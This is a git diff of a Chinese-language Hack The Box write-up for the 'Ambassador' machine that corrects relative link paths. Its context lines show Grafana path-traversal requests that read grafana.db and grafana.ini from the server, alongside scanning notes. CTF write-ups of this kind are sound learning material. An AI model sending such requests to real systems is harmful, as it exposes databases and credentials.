@@ -6,7 +6,7 @@ tags:
 
 ## 扫描
 
-果然用之前写的[对Easy机器的扫描脚本](../WriteUp/HTB-Shoppy.md#htb_easy_firstscaning)不大好使了啊……  
+果然用之前写的[对Easy机器的扫描脚本](./HTB-Shoppy.md#htb_easy_firstscaning)不大好使了啊……  
 自己 `curl -I` 看了眼HTTP响应头真没有域名信息。开浏览器和Burp访问一下目标IP，竟然没有拦截到请求（不过访问 `/robots.txt` 又能拦截）？不是很懂……
 
 还是先回到通常的流程吧，先进行扫描。  
@@ -66,7 +66,7 @@ GET /public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db
 GET /public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini HTTP/1.1
 ```
 
-![HTB-Ambassador-PoC](./evidence-img/HTB-Ambassador-PoC.png)
+![HTB-Ambassador-PoC](./../evidence-img/HTB-Ambassador-PoC.png)
 
 *这里直接 `grep grafana.db` 会有什么bin文件报错。后来才发觉这个就真是整个DB库，可以在本地用SQL命令进行访问的*
 
